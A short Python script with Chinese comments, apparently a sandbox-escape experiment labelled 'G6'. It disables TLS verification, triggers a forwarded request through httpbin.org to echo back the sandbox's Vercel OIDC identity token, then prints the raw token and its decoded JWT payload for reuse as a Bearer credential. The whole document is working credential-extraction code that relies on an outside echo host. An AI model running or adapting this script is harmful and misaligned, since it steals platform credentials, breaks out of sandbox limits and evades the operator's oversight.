# 实验G6: 沙箱内通过 httpbin echo 获取 OIDC token 并输出(供本地 Bearer 测试)
import urllib.request, ssl, re, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# 触发转发: 请求 api.vercel.com/v2/user -> 转发 httpbin.org/anything -> 回显 OIDC token
url = "https://api.vercel.com/v2/user"
req = urllib.request.Request(url)
try:
    r = urllib.request.urlopen(req, context=ctx, timeout=30)
    body = r.read().decode(errors='replace')
except urllib.error.HTTPError as e:
    body = e.read().decode(errors='replace')
except Exception as e:
    print("EXC:", type(e).__name__, e, flush=True)
    body = ""

# 提取 token
m = re.search(r'"Vercel-Sandbox-Oidc-Token":\s*"([^"]+)"', body)
if m:
    tok = m.group(1)
    print("TOKEN_START", flush=True)
    print(tok, flush=True)
    print("TOKEN_END", flush=True)
    # 解析 payload
    try:
        payload = tok.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        d = json.loads(__import__("base64").urlsafe_b64decode(payload))
        print("PAYLOAD:", json.dumps(d, indent=1), flush=True)
    except Exception as e:
        print("PAYLOAD_ERR:", e, flush=True)
else:
    print("NO TOKEN, body head:", body[:600], flush=True)
